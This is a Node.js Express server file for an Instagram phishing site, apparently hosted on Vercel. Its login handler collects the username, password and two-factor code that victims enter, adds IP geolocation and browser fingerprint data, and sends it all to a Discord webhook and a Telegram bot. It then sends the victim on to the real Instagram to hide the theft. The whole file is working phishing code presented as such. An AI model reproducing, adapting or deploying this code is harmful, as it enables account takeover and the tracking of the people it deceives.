const express = require('express');
const path = require('path');

const app = express();

// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, '..', 'public')));

// Serve the login page
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, '..', 'public', 'index.html'));
});

// Parse User-Agent to extract browser details
function parseUserAgent(ua) {
  const info = {
    raw: ua,
    browser: 'Unknown',
    version: 'Unknown',
    os: 'Unknown',
    device: 'Unknown',
    isMobile: false
  };

  if (ua.includes('Firefox/')) {
    info.browser = 'Firefox';
    const m = ua.match(/Firefox\/([\d.]+)/);
    if (m) info.version = m[1];
  } else if (ua.includes('Edg/')) {
    info.browser = 'Edge';
    const m = ua.match(/Edg\/([\d.]+)/);
    if (m) info.version = m[1];
  } else if (ua.includes('Chrome/')) {
    info.browser = 'Chrome';
    const m = ua.match(/Chrome\/([\d.]+)/);
    if (m) info.version = m[1];
  } else if (ua.includes('Safari/') && !ua.includes('Chrome')) {
    info.browser = 'Safari';
    const m = ua.match(/Version\/([\d.]+)/);
    if (m) info.version = m[1];
  }

  if (ua.includes('Windows NT 10.0')) info.os = 'Windows 10';
  else if (ua.includes('Windows NT 6.3')) info.os = 'Windows 8.1';
  else if (ua.includes('Windows NT 6.1')) info.os = 'Windows 7';
  else if (ua.includes('Mac OS X')) {
    const m = ua.match(/Mac OS X ([\d_]+)/);
    info.os = m ? `macOS ${m[1].replace(/_/g, '.')}` : 'macOS';
  } else if (ua.includes('Android')) {
    const m = ua.match(/Android ([\d.]+)/);
    info.os = m ? `Android ${m[1]}` : 'Android';
    info.isMobile = true;
  } else if (ua.includes('iPhone') || ua.includes('iPad')) {
    info.os = ua.includes('iPhone') ? 'iOS (iPhone)' : 'iOS (iPad)';
    info.isMobile = true;
    const m = ua.match(/OS ([\d_]+)/);
    if (m) info.os = `iOS ${m[1].replace(/_/g, '.')}`;
  } else if (ua.includes('Linux')) {
    info.os = 'Linux';
  }

  if (ua.includes('iPhone')) info.device = 'iPhone';
  else if (ua.includes('iPad')) info.device = 'iPad';
  else if (ua.includes('Android')) { info.device = 'Android Device'; info.isMobile = true; }
  else if (ua.includes('Windows')) info.device = 'Windows PC';
  else if (ua.includes('Macintosh')) info.device = 'Mac';
  else if (ua.includes('Linux')) info.device = 'Linux PC';

  return info;
}

// Capture endpoint
app.post('/login', async (req, res) => {
  try {
    const { username, password, twofa } = req.body || {};

    // Get IP
    const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim()
      || req.headers['x-real-ip']
      || req.socket?.remoteAddress
      || 'unknown';

    // Browser details
    const userAgent = req.headers['user-agent'] || 'unknown';
    const browserInfo = parseUserAgent(userAgent);

    // Geo location from IP
    let geo = { city: 'Unknown', region: 'Unknown', country: 'Unknown', lat: '0', lon: '0' };
    try {
      const controller = new AbortController();
      const timeout = setTimeout(() => controller.abort(), 3000);
      const geoRes = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,regionName,city,lat,lon,isp,org,query,timezone`, {
        signal: controller.signal
      });
      clearTimeout(timeout);
      const geoData = await geoRes.json();
      if (geoData.status === 'success') {
        geo = {
          city: geoData.city || 'Unknown',
          region: geoData.regionName || 'Unknown',
          country: geoData.country || 'Unknown',
          lat: geoData.lat || '0',
          lon: geoData.lon || '0',
          query: geoData.query || ip,
          isp: geoData.isp || 'Unknown',
          org: geoData.org || 'Unknown',
          timezone: geoData.timezone || 'Unknown'
        };
      }
    } catch (geoErr) {
      // geo failed, use defaults
    }

    // Get Vercel geo headers (if available on Pro)
    const vercelGeo = {
      country: req.headers['x-vercel-ip-country'] || null,
      region: req.headers['x-vercel-ip-country-region'] || null,
      city: req.headers['x-vercel-ip-city'] || null
    };

    // Compile all captured data
    const capturedData = {
      timestamp: new Date().toISOString(),
      ip,
      geo,
      vercelGeo,
      browser: browserInfo,
      credentials: {
        username: username || 'Not provided',
        password: password || 'Not provided',
        twofa: twofa || 'Not provided'
      },
      headers: {
        'accept': req.headers['accept'] || 'unknown',
        'accept-language': req.headers['accept-language'] || 'unknown',
        'accept-encoding': req.headers['accept-encoding'] || 'unknown',
        'sec-ch-ua': req.headers['sec-ch-ua'] || 'unknown',
        'sec-ch-ua-platform': req.headers['sec-ch-ua-platform'] || 'unknown',
        'sec-ch-ua-mobile': req.headers['sec-ch-ua-mobile'] || 'unknown',
        'referer': req.headers['referer'] || 'unknown',
        'origin': req.headers['origin'] || 'unknown'
      }
    };

    // Log to Vercel console
    console.log('');
    console.log('╔══════════════════════════════════════════╗');
    console.log('║        INSTAGRAM - CAPTURED DATA        ║');
    console.log('╚══════════════════════════════════════════╝');
    console.log(JSON.stringify(capturedData, null, 2));
    console.log('════════════════════════════════════════════');
    console.log('');

    // Send to Discord webhook if configured (set env var DISCORD_WEBHOOK)
    if (process.env.DISCORD_WEBHOOK) {
      try {
        const embed = {
          title: '📸 Instagram Credentials Captured',
          color: 0xE1306C,
          fields: [
            { name: '👤 Username', value: capturedData.credentials.username, inline: true },
            { name: '🔑 Password', value: capturedData.credentials.password, inline: true },
            { name: '🔐 2FA Code', value: capturedData.credentials.twofa || 'Not provided', inline: true },
            { name: '🌐 IP Address', value: capturedData.ip, inline: true },
            { name: '📍 Location', value: `${geo.city}, ${geo.region}, ${geo.country}`, inline: true },
            { name: '🌏 Coordinates', value: `Lat: ${geo.lat}, Lon: ${geo.lon}`, inline: true },
            { name: '🏢 ISP', value: geo.isp || 'Unknown', inline: true },
            { name: '🌐 Timezone', value: geo.timezone || 'Unknown', inline: true },
            { name: '🖥️ Browser', value: `${browserInfo.browser} ${browserInfo.version}`, inline: true },
            { name: '💻 OS', value: browserInfo.os, inline: true },
            { name: '📱 Device', value: browserInfo.device, inline: true },
            { name: '🕐 Timestamp', value: capturedData.timestamp, inline: false }
          ],
          footer: { text: 'Instagram Phish | Vercel' }
        };
        await fetch(process.env.DISCORD_WEBHOOK, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ embeds: [embed] })
        });
        console.log('Discord notification sent');
      } catch (e) {
        console.error('Discord webhook failed:', e.message);
      }
    }

    // Send to Telegram if configured
    if (process.env.TELEGRAM_BOT_TOKEN && process.env.TELEGRAM_CHAT_ID) {
      try {
        const msg = `📸 *Instagram Credentials Captured*%0A%0A` +
          `👤 *Username:* ${capturedData.credentials.username}%0A` +
          `🔑 *Password:* ${capturedData.credentials.password}%0A` +
          `🔐 *2FA:* ${capturedData.credentials.twofa || 'Not provided'}%0A%0A` +
          `🌐 *IP:* ${capturedData.ip}%0A` +
          `📍 *Location:* ${geo.city}, ${geo.region}, ${geo.country}%0A` +
          `🌏 *Coords:* ${geo.lat}, ${geo.lon}%0A` +
          `🖥️ *Browser:* ${browserInfo.browser} ${browserInfo.version}%0A` +
          `💻 *OS:* ${browserInfo.os}%0A` +
          `📱 *Device:* ${browserInfo.device}%0A` +
          `🕐 *Time:* ${capturedData.timestamp}`;

        await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: process.env.TELEGRAM_CHAT_ID,
            text: msg.replace(/%0A/g, '\n'),
            parse_mode: 'Markdown'
          })
        });
        console.log('Telegram notification sent');
      } catch (e) {
        console.error('Telegram webhook failed:', e.message);
      }
    }

    // Return success - redirect to real Instagram
    return res.json({
      success: true,
      redirect: 'https://www.instagram.com'
    });

  } catch (error) {
    console.error('Capture error:', error);
    return res.status(500).json({ error: 'Internal server error' });
  }
});

// Export for Vercel
module.exports = app;
